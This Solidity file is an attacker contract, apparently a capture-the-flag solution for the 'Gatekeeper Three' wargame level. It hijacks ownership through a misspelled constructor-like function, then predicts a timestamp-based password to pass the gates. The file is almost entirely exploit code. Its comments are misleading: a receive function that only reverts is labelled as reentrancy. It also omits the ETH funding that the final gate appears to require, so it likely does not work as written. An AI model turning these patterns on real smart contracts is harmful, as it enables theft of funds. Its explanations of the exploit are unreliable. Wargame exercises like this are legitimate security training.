pragma solidity ^0.8.0;

interface GatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external;
}


contract EnhancedAttacker {
    GatekeeperThree public immutable target;

    constructor(address _target) {
        target = GatekeeperThree(_target);
        target.construct0r(); // Change ownership to self
    }

    // Exploit starting here
    function attack() external {
        target.createTrick(); // Create the SimpleTrick instance
        uint256 password = block.timestamp;
        target.getAllowance(password); // Set allowEntrance to true
        
        // Now call enter() through the contract's ownership bypassing gateOne
        target.enter(); 
    }

    // Use reentrancy for gateThree modifier
    receive() external payable {
        // Always revert if gateThree receives ETH
        require(false, "Reverted");
    }
}